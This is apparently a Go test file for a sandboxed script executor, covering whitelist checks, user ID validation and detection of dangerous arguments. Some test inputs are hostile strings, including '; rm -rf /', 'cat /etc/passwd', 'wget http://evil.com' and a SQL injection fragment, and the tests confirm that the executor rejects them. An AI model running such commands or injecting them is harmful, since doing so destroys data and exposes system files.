package scripts

import (
	"context"
	"log"
	"os"
	"path/filepath"
	"testing"
	"time"
)

func TestNewExecutor(t *testing.T) {
	scriptsDir := "/test/scripts"
	maxTime := 30 * time.Second
	allowedScripts := []string{"test.py", "test.sh"}
	logger := log.New(os.Stdout, "TEST: ", log.LstdFlags)

	executor := NewExecutor(scriptsDir, maxTime, allowedScripts, logger)

	if executor.scriptsDir != scriptsDir {
		t.Errorf("NewExecutor() scriptsDir = %s, want %s", executor.scriptsDir, scriptsDir)
	}
	if executor.maxExecutionTime != maxTime {
		t.Errorf("NewExecutor() maxExecutionTime = %v, want %v", executor.maxExecutionTime, maxTime)
	}
	if len(executor.allowedScripts) != len(allowedScripts) {
		t.Errorf("NewExecutor() allowedScripts length = %d, want %d", len(executor.allowedScripts), len(allowedScripts))
	}
	if executor.userIDPattern == nil {
		t.Error("NewExecutor() userIDPattern is nil")
	}
}

func TestValidateRequest(t *testing.T) {
	executor := NewExecutor("test", 30*time.Second, []string{"script1.py", "script1.sh"}, nil)

	tests := []struct {
		name        string
		req         ExecutionRequest
		expectError bool
		errorMsg    string
	}{
		{
			name: "valid request",
			req: ExecutionRequest{
				UserID: "test123",
				Script: "script1.py",
			},
			expectError: false,
		},
		{
			name: "invalid user ID - too short",
			req: ExecutionRequest{
				UserID: "abc",
				Script: "script1.py",
			},
			expectError: true,
			errorMsg:    "invalid user ID format",
		},
		{
			name: "invalid user ID - too long",
			req: ExecutionRequest{
				UserID: "abcdefghijklm",
				Script: "script1.py",
			},
			expectError: true,
			errorMsg:    "invalid user ID format",
		},
		{
			name: "invalid user ID - special characters",
			req: ExecutionRequest{
				UserID: "test@123",
				Script: "script1.py",
			},
			expectError: true,
			errorMsg:    "invalid user ID format",
		},
		{
			name: "script not in whitelist",
			req: ExecutionRequest{
				UserID: "test123",
				Script: "malicious.py",
			},
			expectError: true,
			errorMsg:    "script not in whitelist",
		},
		{
			name: "script with path traversal - double dots",
			req: ExecutionRequest{
				UserID: "test123",
				Script: "../script1.py",
			},
			expectError: true,
			errorMsg:    "script not in whitelist", // This is checked first
		},
		{
			name: "script with path traversal - slash",
			req: ExecutionRequest{
				UserID: "test123",
				Script: "/etc/passwd",
			},
			expectError: true,
			errorMsg:    "script not in whitelist", // This is checked first
		},
		{
			name: "dangerous argument - command injection",
			req: ExecutionRequest{
				UserID:    "test123",
				Script:    "script1.py",
				Arguments: []string{"; rm -rf /"},
			},
			expectError: true,
			errorMsg:    "dangerous pattern detected",
		},
		{
			name: "dangerous argument - pipe",
			req: ExecutionRequest{
				UserID:    "test123",
				Script:    "script1.py",
				Arguments: []string{"test | cat /etc/passwd"},
			},
			expectError: true,
			errorMsg:    "dangerous pattern detected",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := executor.validateRequest(tt.req)

			if tt.expectError && err == nil {
				t.Error("validateRequest() expected error but got none")
			}
			if !tt.expectError && err != nil {
				t.Errorf("validateRequest() unexpected error: %v", err)
			}
			if tt.expectError && err != nil && tt.errorMsg != "" {
				if err.Error() == "" || err.Error()[:len(tt.errorMsg)] != tt.errorMsg {
					t.Errorf("validateRequest() error = %v, want message containing %s", err, tt.errorMsg)
				}
			}
		})
	}
}

func TestDetectScriptType(t *testing.T) {
	executor := NewExecutor("test", 30*time.Second, []string{}, nil)

	tests := []struct {
		name       string
		scriptName string
		expected   ScriptType
	}{
		{"python script", "test.py", ScriptTypePython},
		{"bash script", "test.sh", ScriptTypeBash},
		{"zsh script", "test.zsh", ScriptTypeZsh},
		{"no extension", "test", ScriptTypePython}, // default
		{"multiple dots", "test.backup.py", ScriptTypePython},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := executor.detectScriptType(tt.scriptName)
			if result != tt.expected {
				t.Errorf("detectScriptType(%s) = %v, want %v", tt.scriptName, result, tt.expected)
			}
		})
	}
}

func TestGetInterpreterCommand(t *testing.T) {
	executor := NewExecutor("test", 30*time.Second, []string{}, nil)

	tests := []struct {
		name       string
		scriptType ScriptType
		expected   string
	}{
		{"python", ScriptTypePython, "python"},
		{"bash", ScriptTypeBash, "bash"},
		{"zsh", ScriptTypeZsh, "zsh"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := executor.getInterpreterCommand(tt.scriptType)
			if result != tt.expected {
				t.Errorf("getInterpreterCommand(%v) = %s, want %s", tt.scriptType, result, tt.expected)
			}
		})
	}
}

func TestGetScriptPath(t *testing.T) {
	scriptsDir := "/test/scripts"
	executor := NewExecutor(scriptsDir, 30*time.Second, []string{}, nil)

	tests := []struct {
		name       string
		scriptName string
		scriptType ScriptType
		expected   string
	}{
		{"python script", "test.py", ScriptTypePython, filepath.Join(scriptsDir, "python", "test.py")},
		{"bash script", "test.sh", ScriptTypeBash, filepath.Join(scriptsDir, "bash", "test.sh")},
		{"zsh script", "test.zsh", ScriptTypeZsh, filepath.Join(scriptsDir, "zsh", "test.zsh")},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := executor.getScriptPath(tt.scriptName, tt.scriptType)
			if result != tt.expected {
				t.Errorf("getScriptPath(%s, %v) = %s, want %s", tt.scriptName, tt.scriptType, result, tt.expected)
			}
		})
	}
}

func TestPrepareScriptArgs(t *testing.T) {
	executor := NewExecutor("test", 30*time.Second, []string{}, nil)
	scriptPath := "/test/path/script.py"
	userID := "user123"

	tests := []struct {
		name       string
		scriptType ScriptType
		expected   []string
	}{
		{"python", ScriptTypePython, []string{"-u", scriptPath, userID}},
		{"bash", ScriptTypeBash, []string{scriptPath, userID}},
		{"zsh", ScriptTypeZsh, []string{scriptPath, userID}},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := executor.prepareScriptArgs(tt.scriptType, scriptPath, userID)
			if len(result) != len(tt.expected) {
				t.Errorf("prepareScriptArgs() length = %d, want %d", len(result), len(tt.expected))
				return
			}
			for i, arg := range result {
				if arg != tt.expected[i] {
					t.Errorf("prepareScriptArgs()[%d] = %s, want %s", i, arg, tt.expected[i])
				}
			}
		})
	}
}

func TestContainsDangerousPatterns(t *testing.T) {
	executor := NewExecutor("test", 30*time.Second, []string{}, nil)

	tests := []struct {
		name      string
		input     string
		dangerous bool
	}{
		{"safe input", "hello world", false},
		{"semicolon", "test; rm -rf", true},
		{"pipe", "test | cat", true},
		{"redirect", "test > file", true},
		{"command substitution", "test `whoami`", true},
		{"logical and", "test && rm", true},
		{"path with numbers", "/path/123", false},
		{"email address", "user@domain.com", false},
		{"sql injection attempt", "'; DROP TABLE", true},
		{"python command", "python script.py", true},
		{"wget command", "wget http://evil.com", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := executor.containsDangerousPatterns(tt.input)
			if result != tt.dangerous {
				t.Errorf("containsDangerousPatterns(%s) = %v, want %v", tt.input, result, tt.dangerous)
			}
		})
	}
}

func TestBuildSecureEnvironment(t *testing.T) {
	executor := NewExecutor("test", 30*time.Second, []string{}, nil)

	env := executor.buildSecureEnvironment()

	// Check that basic security environment variables are present
	requiredVars := []string{
		"HOME=/tmp",
		"USER=scriptrunner",
		"SHELL=/bin/false",
		"LANG=C.UTF-8",
		"PYTHONIOENCODING=utf-8",
	}

	for _, required := range requiredVars {
		found := false
		for _, envVar := range env {
			if envVar == required {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("buildSecureEnvironment() missing required variable: %s", required)
		}
	}
}

func TestExecuteWithInvalidScript(t *testing.T) {
	// Create temporary directory for test
	tempDir := t.TempDir()

	// Create logger for the test
	logger := log.New(os.Stdout, "TEST: ", log.LstdFlags)
	executor := NewExecutor(tempDir, 5*time.Second, []string{"nonexistent.py"}, logger)

	req := ExecutionRequest{
		UserID: "test123",
		Script: "nonexistent.py",
	}

	result, err := executor.Execute(context.Background(), req)

	if err == nil {
		t.Error("Execute() expected error for nonexistent script but got none")
	}

	if result == nil {
		t.Error("Execute() returned nil result")
	} else {
		if result.Success {
			t.Error("Execute() result.Success = true, want false for nonexistent script")
		}
		if result.Error == "" {
			t.Error("Execute() result.Error is empty for failed execution")
		}
	}
}

func BenchmarkValidateRequest(b *testing.B) {
	executor := NewExecutor("test", 30*time.Second, []string{"script1.py"}, nil)
	req := ExecutionRequest{
		UserID: "test123",
		Script: "script1.py",
	}

	for i := 0; i < b.N; i++ {
		executor.validateRequest(req)
	}
}

func BenchmarkDetectScriptType(b *testing.B) {
	executor := NewExecutor("test", 30*time.Second, []string{}, nil)

	for i := 0; i < b.N; i++ {
		executor.detectScriptType("test.py")
	}
}
